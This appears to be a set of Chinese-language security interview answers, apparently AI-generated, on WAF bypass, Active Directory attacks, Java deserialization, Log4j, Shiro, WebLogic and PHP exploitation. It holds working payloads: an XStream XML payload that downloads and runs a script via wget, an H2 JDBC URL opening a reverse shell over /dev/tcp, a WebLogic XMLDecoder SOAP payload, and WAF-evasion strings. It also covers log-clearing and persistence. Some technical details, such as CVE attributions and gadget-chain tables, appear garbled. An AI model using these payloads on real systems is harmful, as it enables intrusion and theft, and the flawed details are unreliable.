## 来源
https://github.com/vvmdx/Sec-Interview-4-2023
# O3回答
## 1. 有绕 WAF 的实战经验吗？从各种漏洞的角度谈一下
<details>
<summary>点击展开答案</summary>

### 1.1 绕过思路总览
1. 架构层：直接绕过 WAF 流量，例如找源站真实 IP、利用同网段/旁路、SSRF/开放调试端口等。
2. 协议层：利用 HTTP/HTTPS 解析差异（分块传输、畸形 multipart、HTTP/2 转 HTTP/1.1）、字符编码差异（URL 双重编码、%u 编码）等。
3. 资源层：POST Body 超长、文件上传分片/文件聚合等方式让 WAF 无法完整扫描 payload。
4. 规则层：针对 WAF 语义/正则缺陷——关键字同义变形、大小写、空白符绕过、SQL/LDAP/XML 特性、注释/混淆等。
5. 自动化：结合 BurpSuite & 自研 Fuzzer，动态生成 payload + AI 语义重写，快速验证各类绕过手法。

### 1.2 不同漏洞的典型绕过技巧
| 漏洞类型 | 绕过技巧示例 |
|---------|-------------|
| SQLi | ‑ 空白符/注释穿插 (`UN/**/ION/**/SELECT`)；<br>- MySQL 双写反斜杠 `\`、浮点数解析 `1e0UNIONSELECT`；<br>- 二次编码、大小写、内联注释等 |
| XSS | ‑ 双写闭合、DOM 型 Bypass；<br>- 参数污染 `?a=<script>&a=>`；<br>- 协议处理 `data:text/html;base64,` |
| 文件上传 | ‑ 多分片 multipart、双扩展 `shell.php%00.jpg`；<br>- Content-Type 伪造/混合；<br>- IE 解析差异 `filename="\"shell.jsp"` |
| 命令/代码执行 | ‑ 反序列化 Gadget 链混淆；<br>- 利用 DNS/ICMP 出网执行；<br>- MLF 绕过（多级 Log4j payload） |

### 1.3 工具链
* 开源：`burp-bypass-waf`, `sqlmap --tamper`, `wafdizzy`, `ngx_lua_waf_fuzz`。
* 自研：基于 Z3 + GPT4 的 Payload 语义混淆生成器，可快速输出 10^4 变体。

### 1.4 实战案例
1. **某云 WAF**：利用 `Transfer-Encoding: chunked` + 分块错位，使规则只检查前 8K 数据，payload 放在最后 1K 成功执行文件包含。
2. **硬件 WAF**：发现 multipart 隐藏字段未解析，通过 `filename*=utf-8''shell.jsp` 上传脚本，触发 Tomcat 容器真实解析拿到 Shell。
3. **ModSecurity**：规则缺乏 SQL 浮点数与函数组合检测，payload `id=8e0union/**/select user()` 读取敏感信息。

</details>


## 2. 内网渗透、域控这些，说一下实战经历
<details>
<summary>点击展开答案</summary>

### 2.1 典型攻击链
1. **外网打点**：Web Getshell ➜ 拿到工作人员机器 RDP。
2. **信息收集**：BloodHound + PowerView 构建 AD 图谱，识别高价值资产（域控/DC、文件服务器）。
3. **水平移动**：
   * Kerberoasting 拿 MSSQL 服务账号明文；
   * SMB Relay 到打印服务器，获取本地管理员；
   * 利用 `ms14-068` 对未打补丁的子域做票据伪造直接提权。
4. **权限提升**：Dump LSASS 获取域管明文；SkeletonKey 注入万能密码维持。
5. **域控控制**：DCSync 导出全域 Hash，金票据长期控制，GPP 修改推送后门。
6. **痕迹处理**：清理 4624/4625、4688、 PowerShell log，关闭 WDigest 明文缓存。

### 2.2 关键工具 & 技术
* 信息收集：`powerview`, `seatbelt`, `ADFind`, `PingCastle`。
* 横向移动：`impacket` (psexec/wmiexec), `Rubeus`, `PrintNightmare` 利用；
* 凭据：`mimikatz`, `lsassy`, `Dumpert`；
* 隧道：`frp`, `reGeorg`, `socks5` 链。

### 2.3 防御经验
* 关闭不必要 NTLM，强制 SMB 签名；
* 开启 LAPS，阻断横向使用本地管理员；
* 配置严格的 Tier 模型 + PAW，分层管控；
* ATA/EDR 对异常票据（非工作时间创建的 TGT/ST）告警。

</details>


## 3. 谈谈 Java 反序列化 CC 链原理，挑几条熟悉的链
<details>
<summary>点击展开答案</summary>

### 3.1 CC 链核心思想
Commons-Collections 系列依赖 `Transformer` 拼装 **懒执行** 逻辑，在 `HashMap`/`PriorityQueue` 反序列化触发 `readObject ➜ hashCode/compareTo` 过程，从而执行恶意代码。

### 3.2 关键节点
```
InvokerTransformer  → Method.invoke()
ChainedTransformer → 组合变换
LazyMap/TransformedMap → get()/put() 时触发 Transformer
PriorityQueue/HashMap → 反序列化期间调用 compareTo/hashCode
```

### 3.3 常见链
| 链编号 | Java 版本 | 入口类                         | 触发点                     | 说明 |
|-------|-----------|--------------------------------|---------------------------|------|
| CC1   | ≤3.1      | `HashMap`                     | `hashCode()`             | 最经典，利用 `AnnotationInvocationHandler` 包装 `LazyMap` |
| CC3   | ≤3.2      | `PriorityQueue`               | `compare()`              | 利用 `TransformingComparator` + `InvokerTransformer` |
| CC6   | 3.2.1-3.2 | `HashSet`                     | `hashCode()`             | 使用 `TemplatesImpl` 注入字节码，链短且稳定 |
| CC11  | 4.0       | `BadAttributeValueExpException` | `toString()`             | JDK 自带类触发，依托 `Expression` 动态执行 |

### 3.4 以 CC3 为例手写链
1. **构造恶意 `TemplatesImpl`**，字节码中执行 `Runtime.getRuntime().exec()`。
2. 创建 `InvokerTransformer("newTransformer")` ，用于调用上一步生成的实例方法。
3. 使用 `TransformingComparator` 包装该 Transformer。
4. 手动反射设置 `PriorityQueue.comparator = TransformingComparator`，并将队列元素替换为填充的 `TemplatesImpl` 对象。
5. 序列化得到 payload，对目标反序列化点发送。

### 3.5 防御
* 开启 JEP-290 白名单；
* 引入 `SerialFilter`，限制 `org.apache.commons.collections`；
* RASP hook `ObjectInputStream.readObject`，校验黑名单类/字节码。

</details>


## 4. 讲讲 RASP 的概念和原理，以及对抗
<details>
<summary>点击展开答案</summary>

### 4.1 RASP 定义
Runtime Application Self-Protection，运行时应用自保护。
在应用进程内部通过字节码插桩/Hook，对 Web 请求执行路径进行实时监控和阻断，达到防御 SQLi、XSS、反序列化、命令执行等注入类攻击。

### 4.2 工作机制
1. **入口 Hook**：Web 容器 Filter/Servlet 前置拦截，采集 URL/Headers/Body。
2. **核心 API Hook**：`java.sql.*`, `Runtime.exec`, `ClassLoader.defineClass`, `ScriptEngine` 等关键调用。
3. **风险判定**：内置语义引擎 + 规则 + 机器学习，对输入与调用参数匹配；
4. **阻断/降级**：发现风险立刻 `throw SecurityException` 或返回 403，保障业务不中断。

### 4.3 常见对抗
| 对抗方式 | 说明 |
|------|------|
| InlineHook 绕过 | 使用 JNI 调用底层 sys_exec 避开 Java Hook；
| 类加载分离 | 将恶意逻辑放在自定义 `ClassLoader`, 延迟加载；
| 字节码加密/动态生成 | RASP 依赖静态签名识别，动态字节码难以分析；
| 反射逃逸 | 多层反射/MethodHandle 组合，绕过字符串特征匹配；

### 4.4 防守建议
* 针对 native/JNI 监控 syscall；
* 结合 eBPF，对进程异常网络/文件行为告警；
* 动态字节码实时 AST 分析， ML 判定恶意模式；
* DevSecOps 流程：灰盒扫描 + RASP 双重防护。

</details>


## 5. Padding Oracle Attack 讲讲
<details>
<summary>点击展开答案</summary>

### 5.1 原理
针对 **CBC 模式** 分组加密：密文块 `C_i` 在解密后与前一块 `C_{i-1}` 进行 XOR 得到明文。若应用返回关于填充是否正确的不同响应（例如 500 vs 200），攻击者可枚举字节，逐块逆推出明文或构造任意明文。

### 5.2 攻击流程
1. 拿到目标密文 `C = C_0 || C_1 || ... || C_n`；
2. 修改最后两块：对 `C_{n-1}` 进行字节级爆破，使服务器填充校验通过；
3. 根据响应差异确定真实 `P_n` 的最后一个字节；
4. 递推至整个块；
5. 继续向前块迭代，最终解出全部明文或伪造数据。

### 5.3 实战要点
* 需要明确存在填充错误可区分的"神谕"（Oracle）；
* 攻击复杂度：每字节最多 256 次请求，总 O(256·B·N)；
* 可用于获取 JWT、Session Cookie、加密参数……

### 5.4 防御
1. **不要泄露填充错误信息**：统一返回码；
2. 采用 **AEAD**（GCM/CCM）或在 CBC 外层加 MAC；
3. 升级到 TLS1.3/禁用 CBC CipherSuites；
4. 服务端限速 / 强校验重放。

</details>


## 6. BCEL 可以用其他类加载器吗？
<details>
<summary>点击展开答案</summary>

**答案**：可以。BCEL (`org.apache.bcel.util.ClassLoader`) 只是 JDK `ClassLoader` 的一个子类实现，专门解析 `$$BCEL$$` 前缀的 Base64 字节码。只要满足以下条件，完全可以自定义或使用其他现有 `ClassLoader`（如 `URLClassLoader`, `sun.misc.Unsafe.defineClass`，或自写 `ByteArrayClassLoader`）来 `defineClass` 加载 BCEL 生成的字节数组。

关键点：**BCEL 只是生成字节码**，加载动作并不依赖它本身。常见绕过做法：
```java
byte[] code = Utility.decode(bcelStr);
Class<?> evil = new MyByteLoader().define(code);
```
这样可以避开安全产品对 `$$BCEL$$` 字符串的特征检测。

</details>


## 7. XStream 反序列化讲讲
<details>
<summary>点击展开答案</summary>

### 7.1 XStream 简介
基于 XML/JSON ↔ Java 对象转换库，使用反射创建对象，默认禁用安全白名单前极易触发 RCE。

### 7.2 利用条件
1. 版本 <1.4.7 无安全框架；
2. 攻击者可控制 XML 输入；
3. Classpath 中存在可利用 gadget（JDK 本地类或 Commons-Collections）。

### 7.3 核心利用链
1. `java.beans.EventHandler` 代理调用任意 setter 方法；
2. `javax.naming.InitialContext` / `Jndi` 进行远程加载；
3. `ProcessBuilder` / `Runtime` 触发命令。

示例 payload 片段（节选）：
```xml
<java.beans.EventHandler>
  <target class="java.lang.ProcessBuilder">
    <command>
      <string>/bin/bash</string><string>-c</string><string>wget http://x.x.x.x/s;sh s</string>
    </command>
  </target>
  <action>start</action>
</java.beans.EventHandler>
```

### 7.4 防御
* 升级 ≥1.4.18，默认开启 `XStream.setupDefaultSecurity()`；
* 白名单：`xstream.allowTypesByWildcard("com.example.**")`；
* 反序列化前做 XSD Schema 验证 + WAF 关键字过滤。

</details>


## 8. 讲下 Spring 相关的 RCE 原理
<details>
<summary>点击展开答案</summary>

### 8.1 经典漏洞
| CVE | 组件 | 触发条件 | 关键点 |
|-----|------|----------|--------|
| CVE-2010-1622 | SpringMVC | JSP 参数转 Bean | `class.classLoader` 写入文件 |
| Spring4Shell (CVE-2022-22965) | Spring-Bean | JDK ≥9, Tomcat | `class.module.classLoader` 写 war 到 webroot |
| CVE-2018-1270 | Spring Data Commons | 反射 SpEL | `Projection` 接口注入 EL 执行 |
| CVE-2016-1000027 | Spring-Cloud Config | `/env` actuator + Groovy | 远程加载 URL Groovy 脚本 |

### 8.2 Spring4Shell 执行链简述
1. 参数绑定到 `ClassLoader` 对象，修改 `catalina.base` 路径；
2. 通过 `MultipartFile` 写入恶意 JSP 到 webapps/ROOT；
3. RequestDispatcher 访问 JSP 实现 RCE。

### 8.3 防御
* 升级对应版本；
* 生产关闭 `/actuator/env`, `/beans` 等敏感端点；
* WAF 关键参数拦截：`classLoader`, `module`, `resourcePattern` 等；
* 最低权限运行 Spring；
* Build 阶段 BOM 依赖扫描（OWASP-dependency-check, Maven-Spring-Scan）。

</details> 
9. log4j 如何绕过 trustURLCodebase
<details>
<summary>点击查看答案</summary>

**核心思路：仍然走 JNDI，但不再加载远程类，而是让服务端返回"本地已存在"的 ObjectFactory，并借助它去实例化本地可利用类。**  
1. Java8u191 之后 `com.sun.jndi.ldap.object.trustURLCodebase` 默认为 **false**，远程 `javaFactory` 无法被加载。  
2. 仍可利用 *本地* Factory，例如 Tomcat 自带的 `org.apache.naming.factory.BeanFactory`：
   * 服务端 LDAP/RMI 返回：
     * `javaFactory=org.apache.naming.factory.BeanFactory`
     * `javaClassName=javax.el.ELProcessor`
     * `forceString="x=eval"`，同时传递 `x="恶意EL表达式"`
   * BeanFactory 先实例化 `javax.el.ELProcessor`，再调用其 `eval(String)`，完成代码执行。
3. 也可改用本地 `groovy.lang.GroovyShell#evaluate`、`SnakeYAML#load`、`XStream#fromXML` 等单参可执行类，条件：目标 classpath 中存在。
4. 流程概括：
   ```text
   攻击者 --> 发送 ${jndi:ldap://attacker/...} --> 目标JVM
   恶意LDAP响应 Reference -> BeanFactory -> 本地危险类 -> 本地代码执行
   ```
5. 由于只用到本地类，无需出网，成功绕过 trustURLCodebase。

</details>

---

10. linux 除了基本的内核提权还有什么别的方式可以进行提权
<details>
<summary>点击查看答案</summary>

常见本地提权向量（内核漏洞之外）：
1. **SUID/SGID 文件**：错误授予可写/可执行的 SUID 二进制（`find / -perm -4000`），利用 `perl / python / nmap / vim` 等逃逸到 root。  
2. **sudo 配置不当**：`sudo -l` 可运行特定命令；若可编辑文件或含通配符、环境变量注入，直接拿 root。  
3. **Cron / Systemd 任务**：计划任务由 root 调用但脚本/路径可写；修改脚本或置换同名文件即可。  
4. **PATH 劫持**：root 计划任务/脚本调用未写绝对路径的二进制，可在可写目录放置同名可执行文件。  
5. **弱文件权限**：`/etc/passwd`、`/etc/shadow`、可写 logrotate/backup 脚本等。  
6. **Capabilities / setfcap**：如二进制带 `cap_setuid+ep`、`cap_dac_read_search+ep` 等，借其读写或提权。  
7. **服务运行权限过高**：MySQL、Nginx、Tomcat 以 root 身份启动且存在命令注入/插件上传。  
8. **容器 / namespace 漏洞**：Docker 逃逸、LXC/LXD 映射宿主文件系统。  
9. **网络文件系统**：可写 NFS 导出、CIFS 映射导致 root squash 失效。  
10. **密钥、明文口令泄露**：root-cron 环境变量、历史文件、备份脚本中的密码。

实际渗透需先 **枚举**（LinPEAS、pspy、sudo -l、getcap、find suid 等），再结合业务场景选择合适方法。

</details>

---

11. java jdbc 反序列化高版本不出网的条件下如何利用
<details>
<summary>点击查看答案</summary>

思路：利用 **classpath 中已有的 JDBC Driver/DataSourceFactory**，通过 JNDI、JDBC URL 或本地文件触发 Gadget 链，无需外连互联网。

1. **JNDI + 本地 DataSourceFactory**  
   * 目标常见依赖：`commons-dbcp(1/2)`、`tomcat-jdbc`、`druid` 等，均实现 `javax.naming.spi.ObjectFactory`。
   * 恶意 LDAP 返回 `Reference`：
     ```ini
     factory = org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
     driverClassName = org.h2.Driver
     url = jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE TRIGGER t BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nRuntime.getRuntime().exec("bash -c bash -i >&/dev/tcp/xx/xx 0>&1")$$
     initialSize = 1
     ```
   * 应用解析 Reference → 创建数据源 → Driver 初始化语句被执行，完成 RCE。
2. **利用 H2 / Derby 等内存数据库**  
   都自带于 Spring Boot。`INIT=RUNSCRIPT FROM 'inline code'` 或 `CREATE ALIAS EXEC AS $$ void static p() throws Exception {Runtime.getRuntime().exec("/bin/sh -c ...");} $$` 达到执行。  
3. **本地反序列化**  
   高版本 JDK 禁止远程类，但 `javaSerializedData` 仍可放在 LDAP Reference 内。若目标依赖包含 `CommonsCollections` 等链，可直接反序列化触发。  
4. **不出网 & 高版本环境前提**  
   • 不需要下载类 ⇒ 选本地 driver/gadget。  
   • 不依赖外部数据库 ⇒ 可用 H2 Memory / SQLite file 模式。  

关键是：**找准应用已引入的 JDBC 组件，构造能本地执行的 URL/属性，借驱动初始化或反序列化逻辑执行代码。**

</details>

---

12. shiro 反序列化漏洞如果 cookie 中的 payload 过长被 waf 拦截如何绕 waf
<details>
<summary>点击查看答案</summary>

常用绕 WAF 策略：
1. **键名混淆**：利用 Tomcat 对 cookie 换行的宽容，将 `rememberMe` 写成 `rememberMe%0d`、`rememberMe%00` 或插入 `\x0d` → `WAF` 不识别，服务器仍解析。  
2. **拆分请求/异常方法**：
   * 使用非常规 HTTP 方法（`MOVE / TRACE / CUSTOM`），部分设备只检查 GET/POST。  
   * 将长 Cookie 切片为多段（`rememberMe`, `rememberMe1` 等），中间件会自动合并。  
3. **空白符变异**：请求头 key/value 之间使用 **Tab** (`%09`) 代替空格，大多数网关解析失败。  
4. **非法字符干扰 Base64**：向 payload 中插入 `! # $ % & ( ) . [ ] \xeb ...` 等非标准字符，WAF Base64 检测失败，而 Shiro 解密前会过滤忽略这些字节。  
5. **二次编码 & 压缩**：AES-CBC 后再 GZIP，再 Base64，两次编码长度变化大；或 URLencode 分段。  
6. **服务端回显减少体积**：利用无回显命令、内存马，减小字节码长度。  

组合上述技巧即可在长度或关键字受限场景下成功送达恶意序列化数据。

</details>

---

13. 同源策略的绕过方式？
<details>
<summary>点击查看答案</summary>

浏览器同源策略（SOP）常见绕过/利用点：
1. **CORS 配置不当**：服务端使用 `Access-Control-Allow-Origin: *` 或回显 `Origin`，且允许 `credentials=true`，可直接跨域读取敏感接口。  
2. **JSONP / Flash / Silverlight**：老接口支持 `callback=`，或可加载跨域 SWF，引发执行。  
3. **postMessage 滥用**：页面信任任意 `origin` 的消息，攻击者 iframe 嵌入后读写数据。  
4. **window.name & window.opener**：跨域导航后 `window.name` 保持不变，可传递大量数据；`opener.location` 劫持钓鱼。  
5. **Subdomain Takeover / document.domain 降级**：主站将 `document.domain` 设为根域，子域被接管后可与主域通信。  
6. **DNS Rebinding / CSRF**：把 `victim.com` 解析到攻击者服务器，利用浏览器缓存拿到内网资源。  
7. **Protocol/Schema 差异**：`file://`, `data://`, `blob://` 方案可在特定环境访问本地内容。  
8. **浏览器插件/混合渲染**：PDF、Flash 插件可跨域加载内容；老版 WebView 未启用 SOP。  

防护要点：严格 CORS 白名单、为 JSONP 增加签名、使用 CSRF Token、关闭不必要的子域通配、限制 postMessage origin。 

</details> 

---

14. windows 系统发现它是一个域的环境，需要做哪些信息收集？
<details>
<summary>点击查看答案</summary>

基本目标：明确【域结构】【账号资产】【信任关系】【攻击面】四大块。

1. 判断域 & 基本信息
   * `ipconfig /all` 查看 DNS 后缀、域名。
   * `systeminfo` / `net config workstation` 确认 *Logon Server* 与 *Domain*。
   * `whoami /all` 获取当前 SID、组。
2. 枚举域用户/组
   * 无工具：`net user /domain`、`net group /domain`、`net group "Domain Admins" /domain`。
   * PowerView：`Get-NetUser`、`Get-NetGroupMember`、`Invoke-UserHunter` 查找管理员活跃会话。
3. 枚举域机器与服务
   * `net group "Domain Computers" /domain` 拿全部主机名。
   * `Get-NetComputer -Ping` 扫存活；`Find-DomainShare` 枚举共享。
4. 枚举域控 / 信任
   * `nltest /dclist:<域>`、`net time /domain` 找 DC。
   * `Get-NetDomainTrust` / `nltest /domain_trusts` 了解林、双向信任。
5. 安全策略 & 补丁
   * `net accounts /domain` 密码策略。
   * `wmic qfe get HotFixID,InstalledOn` 补丁基线。
6. 抓取凭据入口
   * 检查 `\SYSVOL`、`\NETLOGON` 共享（MS14-025、脚本口令）。
   * 枚举 GPP：`findstr /S /I "cpassword" \\*\SYSVOL\*`。
7. 画图工具
   * BloodHound `SharpHound -c All` 导入后可视化 **Shortest Path to DA**。

完成以上即可为后续提权、横向移动与票据攻击做情报准备。

</details>

---

15. 拿下 Zabbix（已发现 agent）如何进一步获取 Zabbix Server 端？
<details>
<summary>点击查看答案</summary>

1. 利用 **agent 配置**
   * `/etc/zabbix/zabbix_agentd.conf` 中 `Server=`、`ServerActive=` 字段直接给出 Server IP/域名和端口 `10051`。
   * `Hostname=` 可用于在 Server 上定位对应主机条目。
2. **反向跳板**
   * Zabbix Agent 允许 `system.run`（若开启）→ 主动连接 Server，攻击者可通过 agent 执行 `ssh <server>` 等命令。
3. **端口转发探测**
   * agent 端口 10050 默认对 Server 白名单开放，对外不通。可在已控机器上做 `nc <ServerIP> 10051` 验证联通。
4. **凭据收集**
   * `Include=...` 额外配置里经常出现明文数据库或 API Token；
   * 查 `/var/log/zabbix/zabbix_agentd.log` 看是否打印 "failed to accept connection" 含口令。
5. **Zabbix Server Web/DB**
   * 一旦获得 Server 地址：
     * 默认 web `/zabbix/`，弱口令 `Admin/zabbix`；否则尝试从 `conf/zabbix.conf.php` 读数据库口令。
     * DB 账户通常 `zabbix:zabbix`，可直连 MySQL/PostgreSQL。
6. **利用 API 提权**
   * 拿到任意 web 登录后可调用 `/api_jsonrpc.php`：添加脚本、创建远程命令、下发主机配置，实现命令执行。
7. **常见 CVE**
   * 4.x/5.x 多处 SQLi、SSRF、RCE（例如 2016-10134、2020-11800）。可离网直接本地利用。

通过以上路径即可从单台 agent 架好跳板，最终控制整套 Zabbix Server。

</details>

---

16. 遇到 Shiro 反序列化漏洞且有 WAF，如何 Bypass？
<details>
<summary>点击查看答案</summary>

绕过思路 = "**伪装 + 分片 + 变异**"。

1. **Cookie 键名变形**：`rememberMe` → `rememberMe %00` / `reme\x0bberMe`，Tomcat 容忍，WAF 不识别。
2. **多 Cookie 拼接**：将 Base64 按 2 kB 切成 `rememberMe1=...; rememberMe2=...`，在 Server 端 `Cookie|` 自动合并。
3. **HTTP 特性**
   * 利用 `Content-Type: multipart/form-data` 把 payload 放在 **body** 而非 Cookie，通过 307 重定向带回。
   * 使用 **GZIP 压缩** → 长度骤减，服务端自动解压。
4. **Base64 垃圾字节干扰**：每 50 字节插入 `!` `.` `"` 等，Shiro `Base64#decode` 自动过滤非法字符。
5. **无回显链**：选择短小链（URLDNS / JRMP）或 **内存马**，天然减小长度。
6. **协议换道**：若 HTTP 被防护，可走 `WebSocket`、`gRPC`、`T3`(weblogic) 等 Shiro 过滤器同样可达的通道。

组合 1+2+4 即可绕过大部分基于特征/长度的 WAF 规则。

</details>

---

17. 内网渗透中用 mimikatz 抓密码失败的常见原因？
<details>
<summary>点击查看答案</summary>

1. **Credential Guard / LSA Protected Process**：Win10 企业版或 Server 2016+ 开启后，LSASS 受硬件虚拟化保护；`sekurlsa::logonPasswords` 返回空。
2. **缺少权限**：未以 SYSTEM 执行；远程 32-bit shell 注入到 64-bit LSASS；Token 不完整。
3. **WDigest/Net-NTLM 关闭**：`UseLogonCredential=0`、`DisableRestrictedAdmin=1` → 明文密码不进内存，只剩哈希。
4. **EDR/AV Hook**：Defender、CrowdStrike 注入 DLL，截获 LSASS 读操作或直接阻断 `OpenProcess`。
5. **LSASS 未包含目标凭据**：纯 RDP / Runas / TaskScheduler 会话凭据已清理；或用户注销后。
6. **操作系统补丁**：KB2871997 之后 LSASS 中不再缓存某些票据；mimikatz 版本过旧。
7. **Dump 方法错误**：使用 procdump 时 `-ma` 被阻止；卷影复制文件损坏；32 位 dump 解析失败。

排错思路：先本地 SYSTEM，确认 `!process` 可读；若受保护用 `psexec -i -s`+DbgHelp，或改走 LSASS MiniDump API、DCSync、LSA Secrets 等替代路线。

</details>

---

18. PHP 代码审计中 bypass `disable_functions` 的思路？
<details>
<summary>点击查看答案</summary>

1. **利用其它可执行函数**：`fsockopen`+gopher、`mail()`、`preg_replace('/e')`、`assert()`、`putenv()+LD_PRELOAD`、`pcntl_exec`。
2. **利用协议包装器**
   * `expect://`：`file_get_contents('expect://id')`。
   * `imap_open('imap://`cmd`@127.0.0.1')` 执行 `cmd`。
3. **LD_PRELOAD / LD_LIBRARY_PATH**（*Linux-cli 模式*）
   * `putenv('LD_PRELOAD=/tmp/shell.so'); mail()` 触发 `sendmail` 执行。
4. **利用 `proc_open` 家族**：`proc_open`, `popen`, `pcntl_exec` 有时未被禁。
5. **利用 `openssl_decrypt`, `imagepng`, `mcrypt_decrypt`**：写入 Phar 字节，再通过解密/解析触发对象注入 RCE。
6. **使用 FFI / Swoole**：PHP7.4 `ffi_enable=1` 时可 `FFI::cdef` 调 libc 函数。
7. **内存马 & deserialization**：绕过函数限制，直接在当前进程内执行恶意代码（`__destruct` 写文件、覆盖 auto_prepend_file）。

核心：找 **未被列入列表** 但可触发系统调用或动态加载库的 API，再借其完成命令/文件写/反射。

</details>

---

19. PHP 反序列化审计时，没有直接调用 `unserialize()` 如何判断可利用？
<details>
<summary>点击查看答案</summary>

1. **间接反序列化函数**
   * `session_start()` → 解析 `$_SESSION`，可写入 `PHPSESSID` cookie。  
   * `ldap_*`, `imap_*`, `yaml_parse`, `wddx_deserialize`, `pdo_pgsql` `largeObject`, `sqlalchemy` 等内部都会调用 php_var_unserialize。
2. **PHAR 反序列化**
   * 文件操作函数 (`file_exists`, `fopen`, `unlink`, `copy`, `exif_thumbnail`) 当路径以 `phar://` 开头时会先解析存档触发 `__wakeup`。
3. **`assert()` + `base64_decode()` 组合**：开发者自写 `my_unserialize()` 包装，内部走 `eval` 解析字符串。
4. **自定义框架缓存**：如 ThinkPHP `Cache::get()` 会 `json_decode|serialize`；某些使用 `igbinary`、`msgpack`。
5. **触发点定位**
   * 搜索 `O:`、`s:`、`a:` 字节流进入数据库/文件的地方；
   * 关注 `base64_decode` 后再次 `json_decode` 等可互转函数。
6. **利用流程**：找到外部可控数据 → 确认在服务端会走到 php_var_unserialize → 准备 Gadget 链（如 `__destruct` 写文件）→ 发送恶意 payload。

总结：**并不限于 `unserialize()`**，凡是最终调用 *php_var_unserialize()* 的路径都可能成为利用点。

</details>

---

20. 测试时站点有负载均衡（访问有时进马、有时 404），如何继续利用？
<details>
<summary>点击查看答案</summary>

1. **确定后端节点数量与标识**
   * 在 shell 页输出 `hostname`、`ifconfig`，比对不同响应，枚举所有真实 IP。
2. **会话粘滞**
   * 检查 `Set-Cookie: JSESSIONID=xxx.node1`、`BIGipServer` 等负载标签；固定该 cookie 即可锁定节点。
   * 若无粘滞，可用 **IP Hash**：不断更换 `X-Forwarded-For` 直到落到目标节点。
3. **利用缓存特征**
   * 上传大文件至共享 NFS，使所有节点获取同马；或反向利用未同步目录做 **版本探测**。
4. **端口直连**
   * Shell 内部 `ss -lntp` 查看 Tomcat/NGINX 端口 → 从跳板机直接 `curl 10.x.x.x:8080` 绕过 LB。
5. **持久化与横向**
   * 部署计划任务/内存马，保证即使 404 仍可 `dnslog` 管控。
   * 借助共享数据库配置、redis session 等进行横向写马。
6. **最后一步**：与运维同学沟通关闭 LVS/node 一致性或要求灰度发布。  

核心：**获取节点识别信息 → 让请求落到同一节点 / 为所有节点植入后门**。

</details>

---

21. Shiro 如何绕 WAF（补充）
<details>
<summary>点击查看答案</summary>

除第 16 题方法，还可：

* **加密层再封装**：将 AES 加密后的 cookie 再次用自定义 XOR/RC4 加密，后台 Filter 解包，而 WAF 无解码逻辑。
* **走非 HTTP**：Shiro 可用于 `WebSocket`、`SSH` 会话管理，使用同一 `rememberMe` 算法；利用升级握手时塞入大 payload。
* **利用 Padding Oracle**：若 WAF 拦截 cookie，但可触发 500 → 利用 Shiro CVE-2020-1957 Oracle 直接爆破密钥，无需发送大 payload。

防守方应在网关内做二次解码并关闭 "记住我" 功能。

</details>

---

22. WebLogic 遭 WAF 拦截且 IP 被封，下一步怎么操作？
<details>
<summary>点击查看答案</summary>

1. **换通道**
   * WebLogic 独有 **T3/IIOP**(7001) 协议常被忽视，可利用 `CVE-2020-2555 / 2023-21839` 直接 RCE，WAF 仅护 HTTP。
   * 若仅封源 IP，可通过云代理、TOR、回连弹反向 JRMP 让服务器主动连你。
2. **编码与拆包**
   * 将 XML/RCE payload 做 **GZIP + Base64**，利用 `/console.portal?_nfpb=true&_pageLabel=HomePage` 参数 Post 传递。
3. **慢速攻击 (slow POST)**
   * 以 1 byte/s 速度发送，旁路基于速率的 IPS，WebLogic 默认 300 s 超时。
4. **利用 SSRF/后台 Job**
   * 若初步访问被拦，可钓鱼管理员访问你控制的 URL，触发 SSRF 连出。
5. **社工或内网跳板**
   * 通过已控内网机器直接 127.0.0.1:7001 区分 WAF 仅在边界。
6. **降权信息收集**：被 Ban 后先切换为指纹流量 (HTTP HEAD)，持续探测策略更新。  

多协议 + 多手段组合，可在 IP 被 BAN 后继续对 WebLogic 发起利用。

</details>

---

23. JBoss 反序列化原理
<details>
<summary>点击查看答案</summary>

1. **JMXInvoker / HTTPInvoker**：JBoss 提供远程管理；接收序列化对象(`MarshalledInvocation`) 后通过 `ObjectInputStream` 反序列化。
2. **Commons-collections Gadget**：攻击者构造恶意 `MarshalledValue` → 底层 `readObject()` 触发链。
3. **入口协议**
   * `InvokerServlet` (`/invoker/JMXInvokerServlet`) – HTTP POST 序列化流。
   * `jnp://` RMI – JNDI 查找时反序列化。
4. **DeserialisationGuard 缺失**：旧版未做白名单，任何类可被加载。
5. **利用流程**：`ysoserial CommonsCollections5 | curl -d @- http://host:8080/invoker/JMXInvokerServlet` ⇒ RCE。新版本需 `pwn.jsp` 或 JMX Console 密码。

</details>

---

24. WebLogic 反序列化原理及示例漏洞
<details>
<summary>点击查看答案</summary>

* **核心组件**：`T3` 协议接收 `ObjectMessage`，`weblogic.rjvm.InboundMsgAbbrev` 使用 `ObjectInputStream` 解码，未做类过滤。
* **常见链**：Apache CommonsCollections、Spring AOP、JRMP; 在 10.3.6/12.1.3 之前通吃。
* **示例 CVE-2019-2725**
  1. HTTP 漏洞，`wls9_async_response` 组件解析 `SOAP` 包含 `<work:WorkContext>`。
  2. 节点值 Base64 解码即序列化对象 → 走 `XMLDecoder` 反序列化。
  3. Gadget 利用 `java.beans.XMLDecoder` 调用 `java.lang.Runtime` 执行命令。

触发命令：
```xml
<soap:Envelope ...>
 <soap:Header>
  <work:WorkContext>
   <java version="1.8" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
      <array class="java.lang.String" length="3">
        <void index="0"><string>/bin/bash</string></void>
        <void index="1"><string>-c</string></void>
        <void index="2"><string>whoami>/tmp/x</string></void>
      </array>
      <void method="start"/>
    </void>
   </java>
  </work:WorkContext>
 </soap:Header>
 <soap:Body/>
</soap:Envelope>
```

新版通过 `com.tangosol.util.Filters` 白名单+SerialFilter 防护。

</details>

---

25. fastjson 如何判断是否存在漏洞，原理是什么？
<details>
<summary>点击查看答案</summary>

**原理**：`ParserConfig#autoTypeSupport` 在 1.2.24–1.2.68 版本默认开启/可绕过，允许 `@type` 指定任意类 → 反射 newInstance；攻击者选带执行 Gadget 的类触发 RCE。

**探测方法**
1. 发送 POC：`{"@type":"java.lang.Class","val":"java.lang.Exception"}`
   * 若返回报错 `autoType is not support` ⇒ 已修复/关闭。
   * 若返回正常 JSON ⇒ 存在 autoType。
